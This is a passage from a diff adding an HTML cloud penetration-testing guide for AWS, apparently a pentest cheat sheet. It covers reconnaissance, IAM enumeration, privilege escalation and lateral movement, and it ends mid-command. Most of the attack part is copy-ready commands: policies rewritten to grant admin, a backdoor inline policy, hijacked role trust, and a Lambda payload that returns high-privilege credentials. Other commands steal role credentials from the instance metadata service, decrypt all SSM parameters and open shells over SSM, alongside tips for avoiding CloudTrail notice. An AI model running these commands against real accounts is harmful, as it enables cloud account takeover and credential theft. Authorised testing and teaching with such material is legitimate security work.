+<span class="t-cmt"># Decode STS assumed-role ARN to get underlying role</span>
+<span class="t-cmt"># arn:aws:sts::123456789012:assumed-role/RoleName/SessionName</span>
+<span class="t-cmt">#                                        ^role       ^session (often the EC2/service name)</span>
+
+<span class="t-cmt"># Check token expiration (if using temporary creds)</span>
+<span class="t-cmd">aws sts get-caller-identity</span> <span class="t-flag">--query</span> <span class="t-val">'Credentials.Expiration'</span> 2>/dev/null</pre></div>
+    </div>
+
+    <h3>Account &amp; Region Discovery</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Get account ID (also available from get-caller-identity)</span>
+<span class="t-cmd">aws sts get-caller-identity</span> <span class="t-flag">--query</span> <span class="t-val">Account</span> <span class="t-flag">--output</span> text
+
+<span class="t-cmt"># List all enabled regions</span>
+<span class="t-cmd">aws ec2 describe-regions</span> <span class="t-flag">--query</span> <span class="t-val">'Regions[].RegionName'</span> <span class="t-flag">--output</span> text
+
+<span class="t-cmt"># Get account aliases (reveals org/company name)</span>
+<span class="t-cmd">aws iam list-account-aliases</span>
+
+<span class="t-cmt"># Check if part of an AWS Organization</span>
+<span class="t-cmd">aws organizations describe-organization</span> 2>/dev/null
+<span class="t-cmd">aws organizations list-accounts</span> 2>/dev/null
+
+<span class="t-cmt"># Identify account-level service control policies (SCPs)</span>
+<span class="t-cmd">aws organizations list-policies</span> <span class="t-flag">--filter</span> SERVICE_CONTROL_POLICY 2>/dev/null</pre></div>
+    </div>
+
+    <h3>Automated Reconnaissance Script</h3>
+    <div class="callout info">
+      <span class="callout-icon">ℹ️</span>
+      <p>Run this initial recon script immediately after credential setup. It safely checks identity and account-level metadata without touching sensitive services.</p>
+    </div>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt">#!/bin/bash
+# aws-initial-recon.sh — Run first after credential setup</span>
+
+<span class="t-key">PROFILE</span>=<span class="t-val">${1:-default}</span>
+
+echo <span class="t-val">"[*] === AWS Initial Recon ==="</span>
+echo <span class="t-val">"[*] Profile: $PROFILE"</span>
+echo
+
+<span class="t-cmt"># Identity</span>
+echo <span class="t-val">"[*] Identity:"</span>
+<span class="t-cmd">aws sts get-caller-identity</span> <span class="t-flag">--profile</span> <span class="t-var">$PROFILE</span> <span class="t-flag">--output</span> json
+echo
+
+<span class="t-cmt"># Account aliases</span>
+echo <span class="t-val">"[*] Account Aliases:"</span>
+<span class="t-cmd">aws iam list-account-aliases</span> <span class="t-flag">--profile</span> <span class="t-var">$PROFILE</span> 2>/dev/null
+echo
+
+<span class="t-cmt"># Org info</span>
+echo <span class="t-val">"[*] Organization Info:"</span>
+<span class="t-cmd">aws organizations describe-organization</span> <span class="t-flag">--profile</span> <span class="t-var">$PROFILE</span> 2>/dev/null || echo <span class="t-val">"  (not in org or no access)"</span>
+echo
+
+<span class="t-cmt"># IAM password policy (reveals maturity of org)</span>
+echo <span class="t-val">"[*] IAM Password Policy:"</span>
+<span class="t-cmd">aws iam get-account-password-policy</span> <span class="t-flag">--profile</span> <span class="t-var">$PROFILE</span> 2>/dev/null
+echo
+
+<span class="t-cmt"># Check CloudTrail status (are we being logged?)</span>
+echo <span class="t-val">"[*] CloudTrail Trails:"</span>
+<span class="t-cmd">aws cloudtrail describe-trails</span> <span class="t-flag">--profile</span> <span class="t-var">$PROFILE</span> 2>/dev/null | <span class="t-cmd">jq</span> <span class="t-val">'.trailList[] | {Name, HomeRegion, IsMultiRegionTrail, LogFileValidationEnabled}'</span>
+echo
+
+echo <span class="t-val">"[+] Initial recon complete."</span></pre></div>
+    </div>
+
+    <h3>CloudTrail Awareness</h3>
+    <div class="callout warn">
+      <span class="callout-icon">⚠️</span>
+      <p><strong>Most API calls are logged by CloudTrail.</strong> Before heavy enumeration, check trail status, S3 destinations, and whether CloudWatch Alarms are configured on IAM events. Enumeration itself <em>is</em> logged — minimize noisy calls like <code>iam:SimulatePrincipalPolicy</code> in stealth engagements.</p>
+    </div>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List all trails and their logging status</span>
+<span class="t-cmd">aws cloudtrail describe-trails</span>
+<span class="t-cmd">aws cloudtrail get-trail-status</span> <span class="t-flag">--name</span> <span class="t-val">arn:aws:cloudtrail:...:trail/...</span>
+
+<span class="t-cmt"># Check if trails are actually logging</span>
+<span class="t-cmd">aws cloudtrail get-trail-status</span> <span class="t-flag">--name</span> <span class="t-val">trail-name</span> <span class="t-flag">--query</span> <span class="t-val">IsLogging</span>
+
+<span class="t-cmt"># Check GuardDuty status (threat detection)</span>
+<span class="t-cmd">aws guardduty list-detectors</span>
+<span class="t-cmd">aws guardduty get-detector</span> <span class="t-flag">--detector-id</span> <span class="t-val">&lt;id&gt;</span>
+
+<span class="t-cmt"># Check AWS Config (compliance monitoring)</span>
+<span class="t-cmd">aws configservice describe-configuration-recorders</span>
+<span class="t-cmd">aws configservice describe-delivery-channels</span>
+
+<span class="t-cmt"># Check Security Hub</span>
+<span class="t-cmd">aws securityhub describe-hub</span> 2>/dev/null</pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- PHASE 2: ENUMERATION -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="phase2">
+    <div class="section-header">
+      <div class="phase-icon a">🔍</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--amber)">Phase 02</div>
+        <h2>Enumeration &amp; Discovery</h2>
+      </div>
+    </div>
+
+    <p>Systematic enumeration is the backbone of a successful cloud penetration test. The goal is to map all accessible resources, identify the effective permission set of your current identity, and locate high-value targets before attempting exploitation.</p>
+
+    <h3>IAM Identity Enumeration</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Current user's policies (direct and via group)</span>
+<span class="t-cmd">aws iam get-user</span>
+<span class="t-cmd">aws iam list-attached-user-policies</span> <span class="t-flag">--user-name</span> <span class="t-val">&lt;username&gt;</span>
+<span class="t-cmd">aws iam list-user-policies</span> <span class="t-flag">--user-name</span> <span class="t-val">&lt;username&gt;</span>   <span class="t-cmt"># inline policies</span>
+<span class="t-cmd">aws iam list-groups-for-user</span> <span class="t-flag">--user-name</span> <span class="t-val">&lt;username&gt;</span>
+
+<span class="t-cmt"># For each group — fetch attached policies</span>
+<span class="t-cmd">aws iam list-attached-group-policies</span> <span class="t-flag">--group-name</span> <span class="t-val">&lt;group&gt;</span>
+<span class="t-cmd">aws iam list-group-policies</span> <span class="t-flag">--group-name</span> <span class="t-val">&lt;group&gt;</span>   <span class="t-cmt"># inline</span>
+
+<span class="t-cmt"># Get the actual policy document</span>
+<span class="t-cmd">aws iam get-policy</span> <span class="t-flag">--policy-arn</span> <span class="t-val">arn:aws:iam::aws:policy/PolicyName</span>
+<span class="t-cmd">aws iam get-policy-version</span> <span class="t-flag">--policy-arn</span> <span class="t-val">&lt;arn&gt;</span> <span class="t-flag">--version-id</span> <span class="t-val">v1</span>
+
+<span class="t-cmt"># List ALL users, roles, and policies in account</span>
+<span class="t-cmd">aws iam list-users</span>
+<span class="t-cmd">aws iam list-roles</span>
+<span class="t-cmd">aws iam list-policies</span> <span class="t-flag">--scope</span> Local   <span class="t-cmt"># customer-managed only</span>
+
+<span class="t-cmt"># Get current role's policies (if running as a role)</span>
+<span class="t-cmd">aws iam get-role</span> <span class="t-flag">--role-name</span> <span class="t-val">&lt;RoleName&gt;</span>
+<span class="t-cmd">aws iam list-attached-role-policies</span> <span class="t-flag">--role-name</span> <span class="t-val">&lt;RoleName&gt;</span>
+<span class="t-cmd">aws iam list-role-policies</span> <span class="t-flag">--role-name</span> <span class="t-val">&lt;RoleName&gt;</span>   <span class="t-cmt"># inline</span></pre></div>
+    </div>
+
+    <h3>Permission Discovery with enumerate-iam</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Install</span>
+<span class="t-cmd">git clone</span> <span class="t-url">https://github.com/andresriancho/enumerate-iam</span>
+<span class="t-cmd">cd</span> enumerate-iam && <span class="t-cmd">pip install</span> -r requirements.txt
+
+<span class="t-cmt"># Run against current credentials (brute-forces all API calls)</span>
+<span class="t-cmd">python enumerate-iam.py</span> \
+  <span class="t-flag">--access-key</span> <span class="t-var">$AWS_ACCESS_KEY_ID</span> \
+  <span class="t-flag">--secret-key</span> <span class="t-var">$AWS_SECRET_ACCESS_KEY</span> \
+  <span class="t-flag">--session-token</span> <span class="t-var">$AWS_SESSION_TOKEN</span>
+
+<span class="t-cmt"># Output shows: [ALLOWED] ec2:DescribeInstances, [DENIED] iam:ListUsers, etc.</span></pre></div>
+    </div>
+
+    <h3>Service-Wide Resource Discovery</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># S3 — list all buckets (global)</span>
+<span class="t-cmd">aws s3 ls</span>
+<span class="t-cmd">aws s3api list-buckets</span> <span class="t-flag">--query</span> <span class="t-val">'Buckets[].Name'</span>
+
+<span class="t-cmt"># EC2 — instances across all regions (loop)</span>
+<span class="t-key">for</span> region in $(<span class="t-cmd">aws ec2 describe-regions</span> --query <span class="t-val">'Regions[].RegionName'</span> --output text); <span class="t-key">do</span>
+  echo <span class="t-val">"Region: $region"</span>
+  <span class="t-cmd">aws ec2 describe-instances</span> <span class="t-flag">--region</span> $region <span class="t-flag">--query</span> <span class="t-val">'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]'</span> <span class="t-flag">--output</span> table 2>/dev/null
+<span class="t-key">done</span>
+
+<span class="t-cmt"># Lambda functions</span>
+<span class="t-cmd">aws lambda list-functions</span>
+<span class="t-cmd">aws lambda list-functions</span> <span class="t-flag">--query</span> <span class="t-val">'Functions[].[FunctionName,Runtime,Role]'</span> <span class="t-flag">--output</span> table
+
+<span class="t-cmt"># RDS instances</span>
+<span class="t-cmd">aws rds describe-db-instances</span>
+
+<span class="t-cmt"># Secrets Manager</span>
+<span class="t-cmd">aws secretsmanager list-secrets</span>
+
+<span class="t-cmt"># Parameter Store (often contains creds)</span>
+<span class="t-cmd">aws ssm describe-parameters</span>
+<span class="t-cmd">aws ssm get-parameters-by-path</span> <span class="t-flag">--path</span> <span class="t-val">/</span> <span class="t-flag">--recursive</span> <span class="t-flag">--with-decryption</span>
+
+<span class="t-cmt"># CloudFormation stacks (reveal architecture)</span>
+<span class="t-cmd">aws cloudformation list-stacks</span>
+<span class="t-cmd">aws cloudformation describe-stacks</span>
+<span class="t-cmd">aws cloudformation get-template</span> <span class="t-flag">--stack-name</span> <span class="t-val">&lt;stack&gt;</span>
+
+<span class="t-cmt"># EKS clusters</span>
+<span class="t-cmd">aws eks list-clusters</span>
+
+<span class="t-cmt"># ECS clusters and tasks</span>
+<span class="t-cmd">aws ecs list-clusters</span>
+<span class="t-cmd">aws ecs list-tasks</span> <span class="t-flag">--cluster</span> <span class="t-val">&lt;cluster-arn&gt;</span>
+
+<span class="t-cmt"># SNS topics</span>
+<span class="t-cmd">aws sns list-topics</span>
+
+<span class="t-cmt"># SQS queues</span>
+<span class="t-cmd">aws sqs list-queues</span>
+
+<span class="t-cmt"># Kinesis streams</span>
+<span class="t-cmd">aws kinesis list-streams</span>
+
+<span class="t-cmt"># Step Functions state machines</span>
+<span class="t-cmd">aws stepfunctions list-state-machines</span></pre></div>
+    </div>
+
+    <h3>ScoutSuite — Automated Multi-Service Audit</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmd">pip install scoutsuite</span>
+<span class="t-cmd">scout aws</span> <span class="t-flag">--profile</span> <span class="t-var">target</span> <span class="t-flag">--report-dir</span> <span class="t-val">./scout-report</span>
+<span class="t-cmt"># Opens interactive HTML dashboard showing misconfigurations, public resources, etc.</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- PHASE 3: PRIVILEGE ESCALATION -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="phase3">
+    <div class="section-header">
+      <div class="phase-icon v">⬆️</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--violet-hi)">Phase 03</div>
+        <h2>Privilege Escalation</h2>
+      </div>
+    </div>
+
+    <p>AWS privilege escalation exploits misconfigurations in IAM policies — both identity-based and resource-based. A critical insight: AWS evaluates <strong>both</strong> policy types simultaneously. This means even a low-privilege user can gain access if a resource-based policy grants them permissions their identity-based policy doesn't cover.</p>
+
+    <div class="callout note">
+      <span class="callout-icon">🧠</span>
+      <p><strong>Key Principle:</strong> Resource-based policies (on S3, KMS, Secrets Manager, SQS, Lambda, etc.) can <em>bypass</em> identity-based restrictions. Always check resource policies alongside identity policies — they are independent evaluation paths.</p>
+    </div>
+
+    <h3>IAM Privilege Escalation Paths</h3>
+
+    <div class="attack-card open" id="card-1">
+      <div class="attack-card-header" onclick="toggleCard(this)">
+        <div class="attack-card-title">
+          <span class="risk risk-crit">CRITICAL</span>
+          iam:CreatePolicyVersion — Overwrite Policy to Grant Admin
+        </div>
+        <span class="attack-card-chevron">▶</span>
+      </div>
+      <div class="attack-card-body">
+        <p>If you have <code>iam:CreatePolicyVersion</code>, you can create a new version of any customer-managed policy that grants administrator access, then set it as default.</p>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label bash">bash</span><button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button></div>
+          <div class="cmd-body"><pre><span class="t-cmt"># Find a policy you can modify</span>
+<span class="t-cmd">aws iam list-policies</span> <span class="t-flag">--scope</span> Local
+
+<span class="t-cmt"># Create a new version with admin permissions</span>
+<span class="t-cmd">aws iam create-policy-version</span> \
+  <span class="t-flag">--policy-arn</span> <span class="t-val">arn:aws:iam::123456789012:policy/TargetPolicy</span> \
+  <span class="t-flag">--policy-document</span> <span class="t-val">'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'</span> \
+  <span class="t-flag">--set-as-default</span>
+
+<span class="t-cmt"># Verify you now have admin access</span>
+<span class="t-cmd">aws sts get-caller-identity</span>
+<span class="t-cmd">aws s3 ls</span>  <span class="t-cmt"># should work now</span></pre></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="attack-card" id="card-2">
+      <div class="attack-card-header" onclick="toggleCard(this)">
+        <div class="attack-card-title">
+          <span class="risk risk-crit">CRITICAL</span>
+          iam:AttachUserPolicy / iam:AttachRolePolicy — Self-Attach Admin
+        </div>
+        <span class="attack-card-chevron">▶</span>
+      </div>
+      <div class="attack-card-body">
+        <p>If you can attach policies to your own user or to a role you can assume, directly attach <code>AdministratorAccess</code>.</p>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label bash">bash</span><button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button></div>
+          <div class="cmd-body"><pre><span class="t-cmt"># Attach AdministratorAccess to your own user</span>
+<span class="t-cmd">aws iam attach-user-policy</span> \
+  <span class="t-flag">--user-name</span> <span class="t-val">&lt;your-username&gt;</span> \
+  <span class="t-flag">--policy-arn</span> <span class="t-val">arn:aws:iam::aws:policy/AdministratorAccess</span>
+
+<span class="t-cmt"># Or to a role you can assume</span>
+<span class="t-cmd">aws iam attach-role-policy</span> \
+  <span class="t-flag">--role-name</span> <span class="t-val">&lt;RoleName&gt;</span> \
+  <span class="t-flag">--policy-arn</span> <span class="t-val">arn:aws:iam::aws:policy/AdministratorAccess</span>
+
+<span class="t-cmd">aws sts assume-role</span> \
+  <span class="t-flag">--role-arn</span> <span class="t-val">arn:aws:iam::123456789012:role/RoleName</span> \
+  <span class="t-flag">--role-session-name</span> <span class="t-val">privesc</span></pre></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="attack-card">
+      <div class="attack-card-header" onclick="toggleCard(this)">
+        <div class="attack-card-title">
+          <span class="risk risk-crit">CRITICAL</span>
+          iam:PutRolePolicy — Inject Inline Policy
+        </div>
+        <span class="attack-card-chevron">▶</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Adding an inline policy to a role you can assume bypasses the need to create a standalone policy document.</p>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label bash">bash</span><button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button></div>
+          <div class="cmd-body"><pre><span class="t-cmd">aws iam put-role-policy</span> \
+  <span class="t-flag">--role-name</span> <span class="t-val">TargetRole</span> \
+  <span class="t-flag">--policy-name</span> <span class="t-val">BackdoorInline</span> \
+  <span class="t-flag">--policy-document</span> <span class="t-val">'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'</span></pre></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="attack-card">
+      <div class="attack-card-header" onclick="toggleCard(this)">
+        <div class="attack-card-title">
+          <span class="risk risk-high">HIGH</span>
+          iam:PassRole + lambda:CreateFunction — Code Execution as High-Priv Role
+        </div>
+        <span class="attack-card-chevron">▶</span>
+      </div>
+      <div class="attack-card-body">
+        <p>If you can pass a high-privilege role to a Lambda function you create, you can execute code under that role's permissions.</p>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label bash">bash</span><button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button></div>
+          <div class="cmd-body"><pre><span class="t-cmt"># Create a payload ZIP</span>
+<span class="t-cmd">cat</span> > /tmp/lambda_payload.py &lt;&lt; <span class="t-val">'EOF'</span>
+import boto3, json, os
+def handler(event, context):
+    client = boto3.client('sts')
+    identity = client.get_caller_identity()
+    creds = boto3.Session().get_credentials().get_frozen_credentials()
+    return {
+        'identity': identity,
+        'AccessKeyId': creds.access_key,
+        'SecretAccessKey': creds.secret_key,
+        'SessionToken': creds.token
+    }
+<span class="t-val">EOF</span>
+<span class="t-cmd">cd</span> /tmp && <span class="t-cmd">zip</span> payload.zip lambda_payload.py
+
+<span class="t-cmt"># Deploy with a high-privilege role</span>
+<span class="t-cmd">aws lambda create-function</span> \
+  <span class="t-flag">--function-name</span> <span class="t-val">privesc-fn</span> \
+  <span class="t-flag">--runtime</span> <span class="t-val">python3.12</span> \
+  <span class="t-flag">--role</span> <span class="t-val">arn:aws:iam::123456789012:role/HighPrivRole</span> \
+  <span class="t-flag">--handler</span> <span class="t-val">lambda_payload.handler</span> \
+  <span class="t-flag">--zip-file</span> <span class="t-val">fileb:///tmp/payload.zip</span>
+
+<span class="t-cmt"># Invoke and retrieve credentials</span>
+<span class="t-cmd">aws lambda invoke</span> \
+  <span class="t-flag">--function-name</span> <span class="t-val">privesc-fn</span> \
+  <span class="t-flag">--payload</span> <span class="t-val">'{}'</span> \
+  /tmp/response.json
+<span class="t-cmd">cat</span> /tmp/response.json | <span class="t-cmd">jq</span> .</pre></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="attack-card">
+      <div class="attack-card-header" onclick="toggleCard(this)">
+        <div class="attack-card-title">
+          <span class="risk risk-high">HIGH</span>
+          iam:PassRole + iam:CreateInstanceProfile — EC2 Metadata Cred Theft
+        </div>
+        <span class="attack-card-chevron">▶</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Assign a high-privilege instance profile to an EC2 instance you control, then steal creds from the IMDSv1 metadata service.</p>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label bash">bash</span><button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button></div>
+          <div class="cmd-body"><pre><span class="t-cmt"># Create instance profile and attach role</span>
+<span class="t-cmd">aws iam create-instance-profile</span> <span class="t-flag">--instance-profile-name</span> <span class="t-val">privesc-profile</span>
+<span class="t-cmd">aws iam add-role-to-instance-profile</span> \
+  <span class="t-flag">--instance-profile-name</span> <span class="t-val">privesc-profile</span> \
+  <span class="t-flag">--role-name</span> <span class="t-val">HighPrivRole</span>
+
+<span class="t-cmt"># Associate with a running instance you control</span>
+<span class="t-cmd">aws ec2 associate-iam-instance-profile</span> \
+  <span class="t-flag">--iam-instance-profile</span> <span class="t-val">Name=privesc-profile</span> \
+  <span class="t-flag">--instance-id</span> <span class="t-val">i-0abc123...</span>
+
+<span class="t-cmt"># On the EC2 instance — retrieve credentials from IMDS</span>
+<span class="t-cmd">curl</span> http://169.254.169.254/latest/meta-data/iam/security-credentials/
+<span class="t-cmd">curl</span> http://169.254.169.254/latest/meta-data/iam/security-credentials/HighPrivRole</pre></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="attack-card">
+      <div class="attack-card-header" onclick="toggleCard(this)">
+        <div class="attack-card-title">
+          <span class="risk risk-high">HIGH</span>
+          iam:UpdateAssumeRolePolicy — Hijack Trusted Entities
+        </div>
+        <span class="attack-card-chevron">▶</span>
+      </div>
+      <div class="attack-card-body">
+        <p>Modify a role's trust policy to allow your current identity to assume it, even if you weren't originally trusted.</p>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label bash">bash</span><button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button></div>
+          <div class="cmd-body"><pre><span class="t-cmt"># Update trust policy to trust your user</span>
+<span class="t-cmd">aws iam update-assume-role-policy</span> \
+  <span class="t-flag">--role-name</span> <span class="t-val">TargetRole</span> \
+  <span class="t-flag">--policy-document</span> <span class="t-val">'{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::123456789012:user/your-username"
+      },
+      "Action": "sts:AssumeRole"
+    }]
+  }'</span>
+
+<span class="t-cmt"># Now assume the role</span>
+<span class="t-cmd">aws sts assume-role</span> \
+  <span class="t-flag">--role-arn</span> <span class="t-val">arn:aws:iam::123456789012:role/TargetRole</span> \
+  <span class="t-flag">--role-session-name</span> <span class="t-val">session</span></pre></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="attack-card">
+      <div class="attack-card-header" onclick="toggleCard(this)">
+        <div class="attack-card-title">
+          <span class="risk risk-high">HIGH</span>
+          EventBridge Scheduler — Scheduled Admin Actions via Role
+        </div>
+        <span class="attack-card-chevron">▶</span>
+      </div>
+      <div class="attack-card-body">
+        <p>If you have <code>scheduler:CreateSchedule</code> and <code>iam:PassRole</code>, create a schedule that invokes a Lambda function or API call with a high-privilege role. Commonly exploited for privilege escalation when direct policy changes are blocked.</p>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label bash">bash</span><button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button></div>
+          <div class="cmd-body"><pre><span class="t-cmt"># Create schedule group (if needed)</span>
+<span class="t-cmd">aws scheduler create-schedule-group</span> <span class="t-flag">--name</span> <span class="t-val">attack-group</span>
+
+<span class="t-cmt"># Create a one-time schedule that calls STS to escalate</span>
+<span class="t-cmd">aws scheduler create-schedule</span> \
+  <span class="t-flag">--name</span> <span class="t-val">privesc-schedule</span> \
+  <span class="t-flag">--schedule-expression</span> <span class="t-val">'at(2024-01-01T00:01:00)'</span> \
+  <span class="t-flag">--flexible-time-window</span> <span class="t-val">'{"Mode":"OFF"}'</span> \
+  <span class="t-flag">--target</span> <span class="t-val">'{
+    "Arn": "arn:aws:lambda:us-east-1:123456789012:function:TargetFunction",
+    "RoleArn": "arn:aws:iam::123456789012:role/HighPrivSchedulerRole",
+    "Input": "{\"action\":\"escalate\"}"
+  }'</span>
+
+<span class="t-cmt"># Alternative: Use scheduler to invoke Lambda that modifies IAM policies</span>
+<span class="t-cmt"># or to run an SSM Document on an EC2 instance</span></pre></div>
+        </div>
+      </div>
+    </div>
+
+    <h3>Privilege Escalation Checklist</h3>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Permission</th><th>Escalation Method</th><th>Risk</th></tr></thead>
+        <tbody>
+          <tr><td><code>iam:CreatePolicyVersion</code></td><td>Overwrite managed policy with admin doc</td><td><span class="risk risk-crit">CRITICAL</span></td></tr>
+          <tr><td><code>iam:AttachUserPolicy</code></td><td>Attach AdministratorAccess to self</td><td><span class="risk risk-crit">CRITICAL</span></td></tr>
+          <tr><td><code>iam:PutUserPolicy</code></td><td>Add inline admin policy to self</td><td><span class="risk risk-crit">CRITICAL</span></td></tr>
+          <tr><td><code>iam:CreateAccessKey</code></td><td>Create keys for another admin user</td><td><span class="risk risk-crit">CRITICAL</span></td></tr>
+          <tr><td><code>iam:UpdateAssumeRolePolicy</code></td><td>Modify role trust to allow self-assumption</td><td><span class="risk risk-crit">CRITICAL</span></td></tr>
+          <tr><td><code>iam:PassRole</code> + <code>lambda:*</code></td><td>Execute code as high-priv Lambda role</td><td><span class="risk risk-high">HIGH</span></td></tr>
+          <tr><td><code>iam:PassRole</code> + <code>ec2:RunInstances</code></td><td>Launch EC2 with admin instance profile</td><td><span class="risk risk-high">HIGH</span></td></tr>
+          <tr><td><code>iam:PassRole</code> + <code>scheduler:CreateSchedule</code></td><td>EventBridge scheduled admin action</td><td><span class="risk risk-high">HIGH</span></td></tr>
+          <tr><td><code>iam:PassRole</code> + <code>codebuild:StartBuild</code></td><td>Run code as admin build role</td><td><span class="risk risk-high">HIGH</span></td></tr>
+          <tr><td><code>iam:PassRole</code> + <code>cloudformation:CreateStack</code></td><td>Deploy stack with admin role</td><td><span class="risk risk-high">HIGH</span></td></tr>
+          <tr><td><code>lambda:UpdateFunctionCode</code></td><td>Replace Lambda code to exfil env creds</td><td><span class="risk risk-high">HIGH</span></td></tr>
+          <tr><td><code>sts:AssumeRole</code> wildcard</td><td>Assume any role in account</td><td><span class="risk risk-crit">CRITICAL</span></td></tr>
+          <tr><td><code>ssm:StartSession</code></td><td>Shell access to EC2 via Systems Manager</td><td><span class="risk risk-high">HIGH</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- PHASE 4: LATERAL MOVEMENT -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="phase4">
+    <div class="section-header">
+      <div class="phase-icon r">↔️</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--red)">Phase 04</div>
+        <h2>Lateral Movement</h2>
+      </div>
+    </div>
+
+    <p>Once initial access is established, lateral movement focuses on pivoting between services, accounts, and compute resources to widen the attack surface and reach high-value targets.</p>
+
+    <h3>Role Assumption Chains</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Assume a role and export credentials</span>
+<span class="t-var">CREDS</span>=$(<span class="t-cmd">aws sts assume-role</span> \
+  <span class="t-flag">--role-arn</span> <span class="t-val">arn:aws:iam::123456789012:role/TargetRole</span> \
+  <span class="t-flag">--role-session-name</span> <span class="t-val">lateral</span> \
+  <span class="t-flag">--output</span> json)
+
+<span class="t-key">export</span> <span class="t-var">AWS_ACCESS_KEY_ID</span>=$(<span class="t-cmd">echo</span> $CREDS | <span class="t-cmd">jq</span> -r <span class="t-val">'.Credentials.AccessKeyId'</span>)
+<span class="t-key">export</span> <span class="t-var">AWS_SECRET_ACCESS_KEY</span>=$(<span class="t-cmd">echo</span> $CREDS | <span class="t-cmd">jq</span> -r <span class="t-val">'.Credentials.SecretAccessKey'</span>)
+<span class="t-key">export</span> <span class="t-var">AWS_SESSION_TOKEN</span>=$(<span class="t-cmd">echo</span> $CREDS | <span class="t-cmd">jq</span> -r <span class="t-val">'.Credentials.SessionToken'</span>)
+
+<span class="t-cmt"># Discover all assumable roles from current identity</span>
+<span class="t-cmd">aws iam list-roles</span> | <span class="t-cmd">jq</span> <span class="t-val">'.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal | (type == "object" and .Service != null) or . == "*") | .RoleName'</span>
+
+<span class="t-cmt"># Find roles that trust your current account (cross-account opportunity)</span>
+<span class="t-cmd">aws iam list-roles</span> | <span class="t-cmd">jq</span> -r <span class="t-val">'.Roles[] | select(.AssumeRolePolicyDocument | tostring | contains("123456789012")) | .Arn'</span></pre></div>
+    </div>
+
+    <h3>EC2 Instance Pivot via SSM</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List SSM-managed instances (no SSH required)</span>
+<span class="t-cmd">aws ssm describe-instance-information</span>
+
+<span class="t-cmt"># Start interactive shell session (requires Session Manager Plugin)</span>
+<span class="t-cmd">aws ssm start-session</span> <span class="t-flag">--target</span> <span class="t-val">i-0abc123...</span>
+
+<span class="t-cmt"># Run command on remote instance</span>
+<span class="t-cmd">aws ssm send-command</span> \
+  <span class="t-flag">--instance-ids</span> <span class="t-val">i-0abc123...</span> \
+  <span class="t-flag">--document-name</span> <span class="t-val">AWS-RunShellScript</span> \
